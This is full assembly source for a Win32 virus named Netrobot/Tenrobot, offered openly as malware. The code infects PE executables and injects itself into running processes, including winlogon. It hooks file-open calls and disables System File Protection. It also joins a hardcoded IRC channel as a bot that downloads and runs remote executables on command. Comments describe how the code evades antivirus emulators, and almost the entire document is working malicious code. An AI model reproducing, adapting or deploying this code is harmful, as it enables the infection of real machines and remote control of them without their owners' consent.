; Virus characteristics:
;
;   * works on Win 9x/Me/2000/XP
;   * infects PE executables
;   * system/multi-process residency with API patching
;   * hooking user-mode file system open requests (fast infector)
;   * hooking GetProcAddress: passing arguments (0, 0x4e455452 = 'NETR')
;     returns a pointer to Virus Request Handler - a function that returns
;     entry points of certain exported virus routines by index
;     (for use by plugins). They offer quite a useful set of tasks,
;     have a look at "exports_table:" near the end for more details.
;   * payload: a connection to specified IRC server and channel is
;     established if Internet connection is available. Bot waits for
;     commands: !die or !http://.../file.exe (downloading and installing
;     programs, possibly plugins). This is done in the context of an
;     important system process, which lives throughout the OS session.
;   * immediate SFC disabling
;   * one, very simple encryption layer
;   * no polymorphism or metamorphism
;
; Original name of the virus was "Netrobot" (Netro)
; Version 2.0 (W32.Tenrobot) coded in July-August 2003.
; -- Microprocessor

.586p
.model flat, stdcall
option casemap: none

includelib \masm32\lib\kernel32.lib

VIRUS_VERSION_MAJOR = 2
VIRUS_VERSION_MINOR = 0

IRC_SERVER = 0a2111d9h		; first octet = last two digits, etc
IRC_PORT   = 0b1ah			; bytes swapped here as well
IRC_CHAN equ '&netrobot'

;RELEASE equ 1

delta macro reg
LOCAL @@0
	call @@0
@@0:
	pop  reg
	sub  reg, offset @@0
endm

pusht macro text
LOCAL @@0
	call @@0
	db text, 0
@@0:
endm

.code

assume fs:nothing

; ***************************** Common functions *****************************

entry_point:
	call begin
begin:
	push ebp
	mov  ebx, [esp + 8]	
	mov  ebp, [esp + 4]
	sub  dword ptr [esp + 4], (begin - first_generation_host)
ENTRY_POINT_DELTA = ($ - 4)
	and  ebx, 0fffff000h	; PE image must be page aligned
	sub  ebp, offset begin
kernel_image_lookup:
	cmp  dword ptr [ebx + 78], 'sihT'
	jne  continue_kernel_lookup
	mov  eax, [ebx + 3ch]
	add  eax, ebx
	cmp  word ptr [eax], 'EP'
	je   kernel_image_found
continue_kernel_lookup:
	; instead of (at first sight prolly more logical) 4096, let's use 256. This
	; will make the loop longer and at least NAV emulator gives up (every
	; emulator gives up after some amount of time due to the halting problem)
	sub  ebx, 256
	jmp  kernel_image_lookup
kernel_image_found:
	mov  edx, [eax + 78h]
	add  edx, ebx
	mov  esi, [edx + 20h]
	mov  ecx, [edx + 18h]
	add  esi, ebx
	push ecx
kernel_export_lookup:
	lodsd
	add  eax, ebx
	cmp  dword ptr [eax - 1], ('teG' shl 8)
	jne  try_next_export
	cmp  dword ptr [eax + 3], 'corP'
	jne  try_next_export
	cmp  dword ptr [eax + 7], 'rddA'
	jne  try_next_export
	cmp  dword ptr [eax + 11], 'sse'
	je   kernel_export_found
try_next_export:
	loop kernel_export_lookup
	; we are here if EBX taken from the stack was not in KERNEL32.DLL
	pop  ecx
	pop  ebp
	ret
kernel_export_found:
	sub  [esp], ecx
	mov  esi, [edx + 24h]
	pop  ecx
	add  esi, ebx
	movzx eax, word ptr [esi + ecx*2]
	mov  edi, [edx + 1ch]
	add  edi, ebx
	mov  esi, [edi + eax*4]
	add  esi, ebx
	pusht 'CloseHandle'
	push ebx
	call esi
	;int 1
	mov  CloseHandle[ebp], eax
	pusht 'CreateEventA'
	push ebx
	call esi
	mov  CreateEvent[ebp], eax
	pusht 'GetLastError'
	push ebx
	call esi
	mov  GetLastError[ebp], eax
	; this event object prevents virus from being loaded infinitely
	call create_my_event
	test eax, eax
	jz   return_to_host
	push eax
	call [GetLastError + ebp]
	test eax, eax
	jnz  close_return_to_host		; ERROR_ALREADY_EXISTS when already loaded
	pushad
	call check_for_old_netrobot
	call reload_context                             ; \
	xor  al, al                                     ; | SEH control code
	jmp  end_old_netrobot_check		        ; /
check_for_old_netrobot:
	push dword ptr fs:[eax]
	mov  fs:[eax], esp
	push 'NETR'
	push 0
	call esi
	test eax, eax
end_old_netrobot_check:
	mov  esp, fs:[0]
	pop  dword ptr fs:[0]
	pop  eax
	popad
	jnz  close_return_to_host
	lea  eax, crypted_start[ebp]
	mov  dl, [eax - 1]
	call crypt_data
	jmp  crypted_start
close_return_to_host:
	; don't keep the handle open, s.o. may request a shutdown,
	; in which case we wait for deleting the event
	call [CloseHandle + ebp]
return_to_host:
	pop  ebp
	ret

reload_context:
	pop  ecx				; ECX = return address
	mov  eax, [esp + 12]
	mov  [eax + 184], ecx	; update EIP in context struct
	xor  eax, eax			; make the OS sit silently..
	ret

; some lame "crypting engine" to make strings
; unreadable by the first look...
crypt_data:
	mov  dh, dl
	mov  ecx, CRYPTED_SIZE
crypt_data_loop:
	xor  byte ptr [eax], dl
	inc  eax
	add  dl, dh
	loop crypt_data_loop
	ret

my_event_name db 'NR32', 0
create_my_event:
	xor  ecx, ecx
	lea  edx, my_event_name[ebp]
	mov  cl, 1
	push edx
	push ecx
	push ecx
	push 0
	call [CreateEvent + ebp]
	ret

encryption_key db 0
crypted_start:
	push edi
	mov  GetProcAddress[ebp], esi
	lea  esi, import_names_kernel[ebp]
	xor  ecx, ecx
	lea  edi, import_addresses_kernel[ebp]
	mov  cl, NUMBER_OF_KERNEL_IMPORTS
	call import_functions
	mov  lock_count[ebp], ecx
	mov  infector_busy[ebp], ecx
	mov  irc_hook[ebp], ecx
	or   irc_socket[ebp], -1
	sldt cx			; no LDT on NT, it's there on 9x because of 16-bit legacy
	pop  edi
	jcxz do_nt_startup
	mov  eax, [edi + 20]
	push 40h		; PAGE_EXECUTE_READWRITE
	add  eax, ebx
	push 08001000h	; MEM_COMMIT or VA_SHARED (undocumented)
	mov  VxDCall4[ebp], eax
	push TOTAL_SIZE
	push 0
	call [VirtualAlloc + ebp]
	test eax, eax
	jz   close_return_to_host
	xchg eax, edi
	lea  esi, entry_point[ebp]
	mov  ebp, edi
	mov  ecx, (TOTAL_SIZE / 4)
	sub  ebp, offset entry_point
	rep  movsd
	; IMPORTANT: execute create_kernel_thread from shared memory
	lea  edx, create_kernel_thread[ebp]
	lea  eax, w9x_kernel_thread[ebp]
	call edx
	jmp  close_return_to_host
do_nt_startup:
	pusht 'NTDLL'
	call [GetModuleHandle + ebp]
	push ebx
	lea  esi, import_names_ntdll[ebp]
	xor  ecx, ecx
	lea  edi, import_addresses_ntdll[ebp]
	mov  cl, NUMBER_OF_NTDLL_IMPORTS
	xchg eax, ebx
	call import_functions
	pop  ebx
	cmp  RtlUnicodeStringToAnsiString[ebp], 0
	je   close_return_to_host
	pusht 'ADVAPI32'
	call [LoadLibrary + ebp]
	pusht 'LookupPrivilegeValueA'
	push eax
	call [GetProcAddress + ebp]
	xor  ecx, ecx
	mov  LookupPrivilegeValue[ebp], eax
	push ecx
	mov  cl, 2		; SE_PRIVILEGE_ENABLED
	push ecx
	call set_debug_privilege
	call [CreateToolhelp32Snapshot + ebp]
	xchg eax, edi
	mov  ecx, 296
	sub  esp, ecx
	mov  [esp], ecx
	push esp
	push edi
	call [Process32First + ebp]
	mov  process_index[ebp], 1
	and  virus_pid[ebp], 0
loop_install_everywhere:
	push esp
	push edi
	call [Process32Next + ebp]
	test eax, eax
	jz   nt_startup_complete
	push dword ptr [esp + 8]
	push 0
	push 2ah	; PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_CREATE_THREAD
	call [OpenProcess + ebp]
	test eax, eax
	jz   continue_install_everywhere
	push ebx
	xchg eax, ebx
	call nt_infect_process
	cmp  virus_pid[ebp], 0
	jne  skip_injection
	cmp  process_index[ebp], 4	; winlogon is 4th (after System, smss, csrss)
	jb   skip_injection
inject_into_process:
	push eax
	xor  ecx, ecx
	add  eax, (nt_injected_code - entry_point)
	push ecx
	push esp
	push ecx
	push ecx
	push eax
	push ecx
	push ecx
	push ebx
	call [CreateRemoteThread + ebp]
	test eax, eax
	pop  edx
	pop  ecx
	jz   skip_injection
	mov  edx, [esp + 12]
	mov  virus_base[ebp], ecx
	mov  virus_pid[ebp], edx
skip_injection:
	xchg ebx, [esp]
	call [CloseHandle + ebp]
continue_install_everywhere:
	inc  process_index[ebp]
	jmp  loop_install_everywhere
nt_startup_complete:
	add  esp, 296
	push edi
	call [CloseHandle + ebp]
	xor  ecx, ecx
	call set_debug_privilege
	jmp  close_return_to_host

import_functions:
	push ecx
	push esi
	push ebx
	call [GetProcAddress + ebp]
	stosd
	pop  ecx
skip_import_name:
	lodsb
	test al, al
	jnz  skip_import_name
	loop import_functions
	ret

; EBX = socket, EDI = buffer.
; ESI <= number of bytes received including the (CR)LF. CF set on error.
receive_line:
	push edi
	xor  esi, esi
wait_for_data:
	xor  ecx, ecx
	push ebx
	push 1
	mov  eax, esp	; EAX => fd_set
	push ecx
	push 1			; ESP => timeval: wait 1 sec
	push esp
	push ecx
	push ecx
	push eax
	push ecx
	call [select + ebp]
	add  esp, 16
	test terminated[ebp], 1
	jnz  receive_line_failed
	test eax, eax
	jz   wait_for_data
	js   receive_line_failed
	mov  ecx, 512
	sub  ecx, edi
	add  ecx, [esp]
	push 2			; MSG_PEEK
	push ecx
	push edi
	push ebx
	call [recv + ebp]
	test eax, eax
	jz   receive_line_failed
	js   receive_line_failed
	push edi
	push eax
	mov  ecx, eax
	mov  al, 10
	repne scasb
	jne  no_lf_yet
	sub  [esp], ecx		; [ESP] = number of bytes left in this line
	inc  esi
no_lf_yet:
	xor  edi, edi
	xchg edi, [esp + 4]
	push edi
	push ebx
	call [recv + ebp]
	test eax, eax
	jz   receive_line_failed
	js   receive_line_failed
	test esi, esi
	jz   continue_receiving_line
	xchg esi, edi
	pop  edi
	sub  esi, edi
	add  esi, eax
	ret
continue_receiving_line:
	add  edi, eax
	jmp  wait_for_data
receive_line_failed:
	pop  edi
stc_ret:
	stc
	ret

download_thread:
	mov  ebx, [esp + 4]
	push ebp
	push esi
	push edi
	delta ebp
	sub  esp, 512
	mov  edi, esp
	call receive_line
	jc   exit_download_thread
	cmp  dword ptr [edi], 'PTTH'
	jne  exit_download_thread
skip_http_version:
	cmp  byte ptr [edi], ' '
	je   check_http_reply
	inc  edi
	dec  esi
	jnz  skip_http_version
check_http_reply:
	cmp  dword ptr [edi], '002 '
	jne  exit_download_thread
	mov  edi, esp
skip_http_header:
	call receive_line
	jc   exit_download_thread
	dec  esi
	dec  esi
	jnz  skip_http_header
	push edi
	push 255
	call [GetTempPath + ebp]
	lea  esi, [esp + 256]
	push 'RTN'
	mov  edx, esp
	push esi
	push 0
	push edx
	push edi
	call [GetTempFileName + ebp]
	xor  eax, eax
	and  dword ptr [esp], 0
	push eax
	push 2			; CREATE_ALWAYS
	push eax
	push eax
	push 40000000h	; GENERIC_WRITE
	push esi
	call [CreateFile + ebp]
	cmp  eax, -1
	je   exit_download_thread
	xchg eax, esi
http_download_loop:
	push 0
	push 256
	push edi
	push ebx
	call [recv + ebp]
	test eax, eax
	js   download_complete
	jz   download_complete
	push eax
	mov  edx, esp
	push 0
	push edx
	push eax
	push edi
	push esi
	call [WriteFile + ebp]
	pop  ecx
	test eax, eax
	jnz  http_download_loop
download_complete:
	push esi
	call [CloseHandle + ebp]
	push edi
	add  edi, 16
	xor  ecx, ecx
	push edi
	mov  cl, 17
	xor  eax, eax
	rep  stosd
	mov  byte ptr [edi - 68], 68
	mov  cl, 7
	lea  edx, [edi + 172]
CreateProcess_push_args:
	push eax
	loop CreateProcess_push_args
	push edx
	call [CreateProcess + ebp]
exit_download_thread:
	add  esp, 512
	push ebx
	call [closesocket + ebp]
	pop  edi
	pop  esi
	pop  ebp
	ret  4

download_error:
	push ebx
	call [closesocket + ebp]
no_close_download_error:
	pop  ebx
	push 0
	push (IRC_CHANNEL_LEN + 14)
	pusht <'NOTICE ', IRC_CHAN, ' Error', 13>
	push ebx
	call [send + ebp]
	cmp  al, (IRC_CHANNEL_LEN + 14)
	jnz  stc_ret
	jmp  clc_ret

download_and_install:
	mov  server_hostname[ebp], edi
	xchg ecx, esi
	mov  al, '/'
	repne scasb
	jne  clc_ret
	xchg ecx, esi
	push ebx
	push 0
	push 1
	push 2
	call [socket + ebp]
	test eax, eax
	js   no_close_download_error
	dec  edi
	xchg eax, ebx
	mov  byte ptr [edi], 0
	push server_hostname[ebp]
	call [gethostbyname + ebp]
	test eax, eax
	jz   download_error
	mov  eax, [eax + 12]
	mov  eax, [eax]
	push dword ptr [eax]
	push 50000002h
	mov  eax, esp
	push 16
	push eax
	push ebx
	call [connect + ebp]
	add  esp, 8
	test eax, eax
	js   download_error
	push ' TEG'
	mov  eax, esp
	push 0
	push 4
	push eax
	push ebx
	call [send + ebp]
	pop  ecx
	cmp  al, 4
	jne  download_error
	dec  esi
	mov  byte ptr [edi], '/'
	push 0
	push esi
	push edi
	push ebx
	call [send + ebp]
	cmp  eax, esi
	jne  download_error
	push 0
	push 17
	pusht <' HTTP/1.0', 13, 10, 'Host: '>
	push ebx
	call [send + ebp]
	cmp  al,  17
	jne  download_error
	mov  eax, server_hostname[ebp]
	sub  edi, eax
	push 0
	push edi
	push eax
	push ebx
	call [send + ebp]
	cmp  eax, edi
	jne  download_error
	push 0
	push 23
	pusht <13, 10, 'Connection: close', 13, 10, 13, 10>
	push ebx
	call [send + ebp]
	xor  al, 23
	jne  exit_download_thread
	lea  edx, download_thread[ebp]
	push ecx
	push esp
	push eax
	push ebx
	push edx
	push eax
	push eax
	call [CreateThread + ebp]
	pop  ecx
	test eax, eax
	jz   download_error
	pop  ebx
clc_ret:
	clc
	ret

generate_random_nick:
	mov  cl, 9
generate_random_chars:
	imul edx, random_seed[ebp], 134775813
	xor  eax, eax
	inc  edx
	mov  al, 26
	mov  random_seed[ebp], edx
	mul  edx
	lea  eax, [edx + 'a']
	stosb
	dec  cl
	jnz  generate_random_chars
ret_generate_random_chars:
	ret

join_channel:
	mov  joined[ebp], 0
	lea  eax, irc_join_cmd[ebp]
	push 0
	push IRC_JOIN_CMD_LEN
	push eax
	push ebx
	call [send + ebp]
	cmp  al, IRC_JOIN_CMD_LEN
	je   ret_generate_random_chars
	pop  ecx
	jmp  exit_receive_loop

kernel_thread:
	call create_my_event
	mov  event_handle[ebp], eax
	rdtsc
	mov  random_seed[ebp], eax
	pusht 'WSOCK32'
	call [LoadLibrary + ebp]
	test eax, eax
	jz   ret_kernel_thread
	xchg eax, ebx
	lea  esi, import_names_winsock[ebp]
	xor  ecx, ecx
	lea  edi, import_addresses_winsock[ebp]
	mov  cl, NUMBER_OF_WINSOCK_IMPORTS
	call import_functions
	sub  esp, 400
	push esp
	push 101h
	call [WSAStartup + ebp]
	add  esp, 400
	test eax, eax
	jnz  ret_kernel_thread
	push ebx
	pusht 'WININET'
	call [LoadLibrary + ebp]
	test eax, eax
	jz   free_winsock
	push eax
	pusht 'InternetGetConnectedState'
	push eax
	call [GetProcAddress + ebp]
	mov  InternetGetConnectedState[ebp], eax
wait_for_connection:
	test terminated[ebp], 1
	jnz  cleanup_kernel_thread
	push eax
	mov  ecx, esp
	push 0
	push ecx
	call [InternetGetConnectedState + ebp]
	pop  ecx
	test eax, eax
	jnz  connect_irc
	push 30000
	call [Sleep + ebp]
	jmp  wait_for_connection
connect_irc:
	push 0
	push 1	; SOCK_STREAM
	push 2	; AF_INET
	call [socket + ebp]
	test eax, eax
	js   retry_connecting
	xchg eax, ebx
	push irc_server_ip[ebp]
	push (IRC_PORT shl 16 + 2)	; sin_family = AF_INET, sin_port
	mov  eax, esp
	push 16
	push eax
	push ebx
	call [connect + ebp]
	add  esp, 8
	test eax, eax
	js   close_irc_socket
	lea  edi, irc_buffer[ebp]
	push edi
	mov  eax, 'RESU'
	stosd
	mov  al, ' '
	stosb
	call generate_random_nick
	mov  eax, '. . '
	stosd
	mov  al, ' '
	stosb
	call generate_random_nick
	mov  eax, (('CIN' shl 8) + 13)
	stosd
	mov  ax, ' K'
	stosw
	call generate_random_nick
	mov  al, 13
	stosb
	pop  edi
	push 0
	push 44
	push edi
	push ebx
	call [send + ebp]
	cmp  al, 44
	jne  close_irc_socket
irc_receive_loop:
	call receive_line
	jc   close_irc_socket
	.if dword ptr irc_hook[ebp] != 0
		xchg esi, edi
		call [irc_hook + ebp]
		xchg esi, edi
	.endif
	push edi
	cmp  byte ptr [edi], ':'
	jne  no_prefix
skip_prefix:
	dec  esi
	cmp  byte ptr [edi], ' '
	lea  edi, [edi + 1]
	jne  skip_prefix
no_prefix:
	mov  eax, [edi]
	.if eax == ' 100'
		add  edi, 4
		xor  ecx, ecx
		lea  esi, my_nickname[ebp]
		mov  cl, 9
		xchg esi, edi
		rep  movsb
		call join_channel
		mov  irc_socket[ebp], ebx
	.elseif eax == ' 234' || eax == ' 334' || eax == ' 734'
		push 0
		push 15
		push edi
		mov  eax, 'KCIN'
		stosd
		mov  al, ' '
		stosb
		call generate_random_nick
		mov  al, 13
		stosb
		push ebx
		call [send + ebp]
		cmp  al, 15
		jne  exit_receive_loop
	.elseif eax == 'GNIP'
		mov  byte ptr [edi + 1], 'O'
		push 0
		push esi
		push edi
		push ebx
		call [send + ebp]
		cmp  eax, esi
		jne  exit_receive_loop
		cmp  joined[ebp], 1
		je   continue_receive_loop
		call join_channel
	.elseif eax == 'NIOJ'
		add  edi, 5
		.if byte ptr [edi] == ':'
			inc  edi
		.endif
		xor  ecx, ecx
		lea  esi, irc_channel[ebp]
		mov  cl, (IRC_CHANNEL_LEN + 1)
		repe cmpsb
		jne  continue_receive_loop
		mov  joined[ebp], 1
	.elseif eax == 'KCIK'
		add  edi, 5
		xor  ecx, ecx
		lea  esi, irc_channel[ebp]
		mov  cl, IRC_CHANNEL_LEN
		repe cmpsb		; compare channel name
		jne  continue_receive_loop
		cmp  byte ptr [edi], ' '
		jne  continue_receive_loop
		inc  edi
		lea  esi, my_nickname[ebp]
		mov  cl, 9
		repe cmpsb		; compare victim's nickname
		jne  continue_receive_loop
		cmp  byte ptr [edi], ' '
		jne  continue_receive_loop
		call join_channel
	.elseif eax == 'VIRP'
		add  edi, 4
		cmp  dword ptr [edi], ' GSM'
		jne  continue_receive_loop
		add  edi, 4
		sub  esi, 8
	skip_target_name:
		cmp  byte ptr [edi], ' '
		je   check_message_text
		inc  edi
		dec  esi
		jmp  skip_target_name
	check_message_text:
		add  edi, 2
		sub  esi, 2
		mov  eax, [edi]
		cmp  eax, 'eid!'
		je   shutdown_requested
		cmp  eax, 'tth!'
		jne  continue_receive_loop
		add  edi, 4
		cmp  dword ptr [edi], '//:p'
		jne  continue_receive_loop
		add  edi, 4
		sub  esi, 8
		call download_and_install
		jc   exit_receive_loop
	.endif
continue_receive_loop:
	pop  edi
	jmp  irc_receive_loop
shutdown_requested:
	call shutdown_virus
	test eax, eax
	jz   continue_receive_loop
exit_receive_loop:
	pop  edi
close_irc_socket:
	or   irc_socket[ebp], -1
	push ebx
	call [closesocket + ebp]
retry_connecting:
	test terminated[ebp], 1
	jnz  cleanup_kernel_thread
	push 15000
	call [Sleep + ebp]
	jmp  wait_for_connection
cleanup_kernel_thread:
	call [FreeLibrary + ebp]
free_winsock:
	call [WSACleanup + ebp]
	call [FreeLibrary + ebp]
ret_kernel_thread:
	pop  edi
	pop  esi
	pop  ebp
	ret  4

enter_infector:
	xor  eax, eax
	inc  eax
	xadd infector_busy[ebp], eax
	test eax, eax
	ret

leave_infector:
	or   edx, -1
	xadd infector_busy[ebp], edx
	ret

; ESI = file name buffer
check_infect_file:
	lea  edi, file_name_buffer[ebp]
	cld
	or   ecx, -1
	mov  ebx, edi	; EBX = last part of the path
copy_file_name:
	lodsb
	.if al >= 'a' && al <= 'z'
		sub  al, 32
	.endif
	stosb
	.if al == '\' || al == '/'
		mov  ebx, edi
	.endif
	inc  ecx
	test al, al
	jnz  copy_file_name
	cmp  ecx, 5		; at least A.EXE
	jl   ret_check_infect_file
	mov  eax, dword ptr [edi - 5]
	neg  eax
ifdef RELEASE
	cmp  eax, - 'RCS.'
	je   infect_this_file
	cmp  eax, - 'EXE.'
	jne  ret_check_infect_file
else
	cmp  eax, - 'EEE.'
	jne  ret_check_infect_file
endif
check_for_exempts:
	mov  eax, [ebx]
	; Exempts: Windows Commander, LanChat (problems reported),
	;          Protected Storage stuff (must be untouched or will make OE slow)
	.if eax != 'CNIW' && eax != 'NUCW' && eax != '23CW' && eax != 'CNAL' && eax != 'OTSP'
	infect_this_file:
		lea  esi, file_name_buffer[ebp]
		call do_infect_file
	.endif
ret_check_infect_file:
	ret

open_and_map_file:
	push file_name[ebp]
	call [GetFileAttributes + ebp]
	cmp  eax, -1
	je   ret_check_infect_file
	mov  file_attributes[ebp], eax
	push 0
	push file_name[ebp]
	call [SetFileAttributes + ebp]
	test eax, eax
	jz   ret_check_infect_file
	xor  ecx, ecx
	push ecx
	push ecx
	push 3				; OPEN_EXISTING
	push ecx
	push 1				; FILE_SHARE_READ
	push 0c0000000h		; GENERIC_READ or GENERIC_WRITE
	push file_name[ebp]
	call [CreateFile + ebp]
	cmp  eax, -1
	je   restore_file_attributes
	mov  file_handle[ebp], eax
	lea  ecx, file_last_write_time[ebp]
	lea  edx, file_last_access_time[ebp]
	push ecx
	push edx
	push 0
	push eax
	call [GetFileTime + ebp]
	test eax, eax
	jz   close_file_without_truncate
	push 0
	push file_handle[ebp]
	call [GetFileSize + ebp]
	cmp  eax, -1
	je   close_file_without_truncate
	mov  file_size[ebp], eax
	xor  ecx, ecx
	add  eax, ebx
	push ecx
	push eax
	push ecx
	push 4				; PAGE_READWRITE
	push ecx
	push file_handle[ebp]
	call [CreateFileMapping + ebp]
	test eax, eax
	jz   close_file
	xor  ecx, ecx
	mov  file_mapping_handle[ebp], eax
	push ecx
	push ecx
	push ecx
	push 000f001fh		; FILE_MAP_ALL_ACCESS
	push eax
	call [MapViewOfFile + ebp]
	test eax, eax
	jz   close_file_mapping
	mov  file_base[ebp], eax
ret_open_and_map_file:
	ret

calculate_increase:
	mov  ecx, [ebx + 38h]
	mov  eax, (TOTAL_SIZE - 1)
	xor  edx, edx
	add  eax, ecx
	div  ecx
	mul  ecx
	mov  virtual_increase[ebp], eax
	mov  ecx, [ebx + 3ch]
	mov  eax, (CODE_SIZE - 1)
	xor  edx, edx
	add  eax, ecx
	div  ecx
	mul  ecx
	mov  file_increase[ebp], eax
	ret

find_last_section:
	lea  edx, [ebx + 18h]
	movzx eax, word ptr [ebx + 14h]
	add  edx, eax
	movzx eax, word ptr [ebx + 6]
	test eax, eax
	jz   inc_eax_and_ret
	dec  eax
	imul eax, eax, 40
	add  edx, eax
	cmp  dword ptr [edx], 'niw_'	; WinZip Self-Extractor?
	je   inc_eax_and_ret
	mov  eax, [edx + 20]			; PointerToRawData
	add  eax, [edx + 16]			; SizeOfRawData
	sub  eax, file_size[ebp]		; additional data after end of image?
	jc   ret_find_last_section
	sub  ah, ah
ret_find_last_section:
	ret

; ESI = file name buffer
do_infect_file:
	mov  infector_result[ebp], 0
	mov  file_name[ebp], esi
	xor  ebx, ebx
	call open_and_map_file
	jz   ret_open_and_map_file
	cmp  dword ptr file_size[ebp], 2097152	; setup?
	jnb  unmap_and_close_file
	xor  edx, edx
	call install_exception_handler
infection_exception:
	call reload_context
	jmp  deinstall_exception_handler
install_exception_handler:
	push dword ptr fs:[edx]
	mov  fs:[edx], esp
	mov  esi, file_base[ebp]
	cmp  word ptr [esi], 'ZM'
	jne  deinstall_exception_handler
	mov  ebx, [esi + 3ch]
	add  ebx, esi
	cmp  dword ptr [ebx], 'EP'
	jne  deinstall_exception_handler
	test dword ptr [ebx + 16h], 2000h		; DLL?
	jnz  deinstall_exception_handler
	test byte ptr [ebx + 5ch], 2			; subsystem mask: Windows/POSIX
	jz   deinstall_exception_handler
	; check two infection marks, new (currently used) and old
	.if dword ptr [esi + 1ch] == 20202020h || dword ptr [ebx + 58h] == 'RTEN'
		mov  infector_result[ebp], -1
		jmp  deinstall_exception_handler
	.endif
	call calculate_increase
	call unmap_and_close_file
	mov  ebx, file_increase[ebp]
	call open_and_map_file
	jz   deinstall_exception_handler
	mov  esi, file_base[ebp]
	mov  ebx, [esi + 3ch]
	add  ebx, esi
	call find_last_section
	jne  deinstall_exception_handler
	mov  edi, esi
	push esi
	add  edi, [edx + 20]		; PointerToRawData
	lea  esi, entry_point[ebp]
	add  edi, [edx + 16]		; SizeOfRawData
	mov  ecx, (CODE_SIZE / 4)
	push edi
	rep  movsd
	mov  cl, (CODE_SIZE - (CODE_SIZE / 4 * 4))
	jecxz virus_code_written
	rep  movsb
virus_code_written:
	pop  edi
	pop  esi
	push edx
	rdtsc
	xchg eax, edx
	lea  eax, [edi + (crypted_start - entry_point)]
	mov  [eax - 1], dl
	call crypt_data
	pop  edx
	mov  ecx, [edx + 12]		; VirtualAddress
	jecxz deinstall_exception_handler
	add  ecx, [edx + 16]		; ECX = new entry point
	lea  eax, [ecx + (begin - entry_point)]
	sub  eax, [ebx + 28h]		; AddressOfEntryPoint
	mov  [edi + (ENTRY_POINT_DELTA - entry_point)], eax
	mov  [ebx + 28h], ecx		; update AddressOfEntryPoint
	mov  ecx, [edx + 16]		; ECX = size of raw data
	mov  eax, file_increase[ebp]
	.if [edx + 8] < ecx
		mov  [edx + 8], ecx		; VirtualSize correction
	.endif
	add  [edx + 16], eax		; update SizeOfRawData
	add  [ebx + 50h], eax		; update SizeOfImage
	and  dword ptr [ebx + 58h], 0		; reset CheckSum
	mov  eax, virtual_increase[ebp]
	add  [edx + 8], eax			; update VirtualSize
	or   dword ptr [edx + 36], 0e0000000h	; IMAGE_READ_WRITE_EXECUTE
	call virus_get_version
	mov  dword ptr [esi + 1ch], 20202020h	; infection mark
	mov  [esi + 20h], eax		; save my version
infection_complete:
	inc  infector_result[ebp]
deinstall_exception_handler:
	xor  edx, edx
	mov  esp, fs:[edx]
	pop  dword ptr fs:[edx]
	pop  eax
unmap_and_close_file:
	cmp  file_handle[ebp], 0
	je   exit_do_infect_file
	push file_base[ebp]
	call [UnmapViewOfFile + ebp]
close_file_mapping:
	push file_mapping_handle[ebp]
	call [CloseHandle + ebp]
	lea  eax, file_last_write_time[ebp]
	lea  ecx, file_last_access_time[ebp]
	push eax
	push ecx
	push 0
	push file_handle[ebp]
	call [SetFileTime + ebp]
close_file:
	cmp  file_size[ebp], 0
	jne  close_file_without_truncate
	push file_handle[ebp]
	call [SetEndOfFile + ebp]
close_file_without_truncate:
	push file_handle[ebp]
	call [CloseHandle + ebp]
restore_file_attributes:
	push file_attributes[ebp]
	push file_name[ebp]
	call [SetFileAttributes + ebp]
exit_do_infect_file:
	and  file_handle[ebp], 0
ret_do_infect_file:
	ret

; ESI = file name buffer
do_deinfect_file:
	mov  infector_result[ebp], 0
	mov  file_name[ebp], esi
	xor  ebx, ebx
	call open_and_map_file
	jz   ret_do_infect_file
	dec  infector_result[ebp]
	lea  eax, infection_exception[ebp]
	xor  edx, edx
	push eax
	push dword ptr fs:[edx]
	mov  fs:[edx], esp
	mov  esi, file_base[ebp]
	cmp  word ptr [esi], 'ZM'
	jne  deinstall_exception_handler
	mov  ebx, [esi + 3ch]
	add  ebx, esi
	cmp  dword ptr [ebx], 'EP'
	jne  deinstall_exception_handler
	test dword ptr [ebx + 16h], 2000h	; DLL?
	jnz  deinstall_exception_handler
	cmp  dword ptr [esi + 1ch], 20202020h
	jne  deinstall_exception_handler
	call virus_get_version
	cmp  dword ptr [esi + 20h], eax
	jne  deinstall_exception_handler
	inc  infector_result[ebp]
	call calculate_increase
	call find_last_section
	jne  deinstall_exception_handler
	mov  edi, [edx + 20]		; PointerToRawData
	mov  ecx, file_increase[ebp]
	add  edi, [edx + 16]		; SizeOfRawData
	sub  [ebx + 50h], ecx		; decrease SizeOfImage
	sub  edi, ecx
	sub  [edx + 16], ecx		; reduce SizeOfRawData
	mov  eax, [esi + edi + (ENTRY_POINT_DELTA - entry_point)]
	sub  eax, (begin - entry_point)
	sub  [ebx + 28h], eax		; restore AddressOfEntryPoint
	mov  edi, virtual_increase[ebp]
	xor  ebx, ebx
	sub  [edx + 8], edi			; reduce VirtualSize
	mov  [esi + 1ch], ebx		; clear infection mark
	mov  [esi + 20h], ebx		;         ||
	neg  ecx
	push 2						; FILE_END
	push 0
	push ecx
	push file_handle[ebp]
	call [SetFilePointer + ebp]	; prepare for SetEndOfFile
	cmp  eax, -1
	je   infection_complete
	and  file_size[ebp], 0
	jmp  infection_complete

virus_request_handler:
	cmp  eax, NUMBER_OF_EXPORTS
	jnb  vrh_error_exit
	delta edx
	add  edx, exports_table[edx + eax*4]
	xchg eax, edx
	ret
vrh_error_exit:
	xor  eax, eax
	ret

; input: none
; output:
;   EAX = version id (major number in higher word)
; side effects: none
virus_get_version:
	mov  eax, ((VIRUS_VERSION_MAJOR shl 16) + VIRUS_VERSION_MINOR)
	ret

; input:
;   EAX = modification delta
; output:
;   EAX = new counter value
; side effects: infection lock counter is changed
lock_infector:
	delta edx
	add  lock_count[edx], eax
	mov  eax, lock_count[edx]
	ret

; input: none
; output:
;   EAX = 1 if success, 0 otherwise
; side effects: virus unhooks all controlled API's and kills its main thread
shutdown_virus:
	push ebp
	sldt cx
	delta ebp
	jcxz nt_shutdown
	lea  eax, w9x_uninstaller_thread[ebp]
	jmp  do_shutdown_virus
nt_shutdown:
	mov  eax, virus_base[ebp]
	xor  edx, edx
	add  eax, (nt_uninstaller_thread - entry_point)
do_shutdown_virus:
	call create_kernel_thread
	test eax, eax
	jz   exit_shutdown_virus
wait_for_unhook:
	push 10
	call [Sleep + ebp]
	call create_my_event
	test eax, eax
	jz   shutdown_virus_ok
	push eax
	call [GetLastError + ebp]
	test eax, eax
	pop  ecx
	pushfd
	push ecx
	call [CloseHandle + ebp]
	popfd
	jnz  wait_for_unhook
shutdown_virus_ok:
	xor  eax, eax
	inc  eax
exit_shutdown_virus:
	pop  ebp
	ret

; input:
;   EAX = function entry point
; output:
;   EAX = old hook function
; side effects: IRC hook function is set
; remarks: useful only within the virus main thread
install_irc_hook:
	delta edx
	xchg eax, irc_hook[edx]
	ret

